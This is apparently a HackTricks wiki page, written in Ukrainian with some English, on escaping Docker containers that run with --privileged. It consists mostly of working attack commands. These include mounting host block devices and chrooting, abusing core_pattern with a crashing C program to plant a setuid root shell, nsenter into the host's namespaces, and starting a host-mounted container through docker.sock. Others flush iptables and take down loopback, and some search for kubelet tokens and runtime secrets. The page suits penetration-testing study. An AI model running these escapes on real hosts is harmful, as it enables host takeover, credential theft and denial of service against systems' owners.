# Втеча з контейнерів з `--privileged`

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Контейнер, запущений з `--privileged`, — це не те саме, що звичайний контейнер з однією-двома додатковими дозволами. Насправді `--privileged` видаляє або послаблює кілька стандартних механізмів захисту часу виконання, які зазвичай захищають робоче навантаження від небезпечних ресурсів хоста. Точний ефект залежить від runtime та хоста, але для Docker звичайний результат такий:

- надаються всі capabilities
- обмеження device cgroup знімаються
- багато kernel filesystems перестають монтуватися лише для читання
- стандартні masked шляхи procfs зникають
- seccomp фільтрація вимкнена
- ізоляція AppArmor вимкнена
- ізоляція SELinux вимкнена або замінена значно ширшою міткою

Важливий наслідок — привілейований контейнер зазвичай не потребує складного експлоїту ядра. У багатьох випадках він може просто взаємодіяти безпосередньо з пристроями хоста, kernel filesystems, орієнтованими на хост, або інтерфейсами runtime, а потім перейти в shell хоста.

## Що `--privileged` не змінює автоматично

`--privileged` не приєднує автоматично простори імен PID, network, IPC або UTS хоста. Привілейований контейнер усе ще може мати приватні простори імен. Це означає, що деякі ланцюжки втечі вимагають додаткової умови, такої як:

- host bind mount (мапування хоста)
- host PID sharing (спільний PID хоста)
- host networking (мережа хоста)
- visible host devices (видимі пристрої хоста)
- writable proc/sys interfaces (інтерфейси proc/sys з правами запису)

Ці умови часто легко виконуються при реальних неправильних налаштуваннях, але вони концептуально відокремлені від самого `--privileged`.

## Шляхи втечі

### 1. Змонтувати диск хоста через відкриті пристрої

Привілейований контейнер зазвичай бачить набагато більше вузлів пристроїв у `/dev`. Якщо блочний пристрій хоста видимий, найпростіша втеча — змонтувати його та виконати `chroot` у файлову систему хоста:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Якщо кореневий розділ не очевидний, спочатку перелічте блокову розмітку:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Якщо практичний шлях полягає в тому, щоб розмістити setuid helper у доступному для запису монтуванні хоста замість використання `chroot`, пам'ятайте, що не кожна файлова система підтримує setuid bit. Швидка перевірка можливостей на стороні хоста:
```bash
mount | grep -v "nosuid"
```
Це корисно, тому що записувані шляхи під файловими системами з `nosuid` набагато менш цікаві для класичних сценаріїв «помістити setuid shell і виконати його пізніше».

Ослаблені захисти, які тут експлуатуються:

- повний доступ до пристроїв
- широкі capabilities, особливо `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Примонтувати або повторно використати host bind mount та `chroot`

Якщо коренева файлова система хоста вже змонтована всередині контейнера, або якщо контейнер може створювати необхідні монтування, оскільки він є привілейованим, shell хоста часто знаходиться лише на один `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо bind mount кореня хоста відсутній, але сховище хоста доступне, створіть його:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Цей шлях експлуатує:

- ослаблені обмеження монтування
- повні capabilities
- відсутність MAC confinement

Пов'язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Зловживання можливістю запису в `/proc/sys` або `/sys`

Одним з головних наслідків `--privileged` є значне послаблення захистів procfs та sysfs. Це може відкрити інтерфейси ядра, орієнтовані на хост, які зазвичай приховані або змонтовані лише для читання.

Класичний приклад — `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Інші шляхи з високою цінністю включають:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Цей шлях зловживає:

- відсутні масковані шляхи
- відсутні системні шляхи тільки для читання

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Використовуйте повні capabilities для втечі через mount або namespace

Привілейований контейнер отримує capabilities, які зазвичай вилучаються зі стандартних контейнерів, включаючи `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` та багато інших. Часто цього достатньо, щоб перетворити локальне закріплення на втечу з контейнера на хост, щойно з'явиться інша відкрита поверхня.

Простий приклад — монтування додаткових файлових систем і використання входу в namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Якщо host PID також спільний, крок стає ще коротшим:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Цей шлях зловживає:

- стандартним набором привілейованих можливостей (capabilities)
- необов'язковим спільним доступом до PID хоста

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape Through Runtime Sockets

Привілейований контейнер часто має видимий стан runtime хоста або сокети. Якщо доступний сокет Docker, containerd або CRI-O, найпростішим підходом часто є використання runtime API для запуску другого контейнера з доступом до хоста:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Для containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Цей шлях зловживає:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Усунення побічних ефектів мережевої ізоляції

`--privileged` does not by itself join the host network namespace, but if the container also has `--network=host` or other host-network access, the complete network stack becomes mutable:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це не завжди дає прямий host shell, але може призвести до denial of service, перехоплення трафіку або доступу до loopback-only management services.

Пов'язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Читання секретів хоста та стану виконання

Навіть коли clean shell escape не відбувається миттєво, privileged containers часто мають достатній доступ, щоб читати секрети хоста, стан kubelet, runtime metadata та файлові системи сусідніх контейнерів:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Якщо `/var` змонтований з хоста або runtime-директорії видимі, цього може бути достатньо для lateral movement або cloud/Kubernetes credential theft навіть до отримання host shell.

Пов'язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Перевірки

Мета наступних команд — підтвердити, які privileged-container escape families є одразу застосовними.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Що тут цікаво:

- повний набір Linux capabilities, особливо `CAP_SYS_ADMIN`
- proc/sys доступний для запису
- видимі пристрої хоста
- відсутні seccomp і MAC confinement
- runtime sockets або host root bind mounts

Будь-який із цих факторів може бути достатнім для post-exploitation. Кілька одночасно зазвичай означають, що контейнер фактично на відстані однієї-двох команд від компрометації хоста.

## Related Pages

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
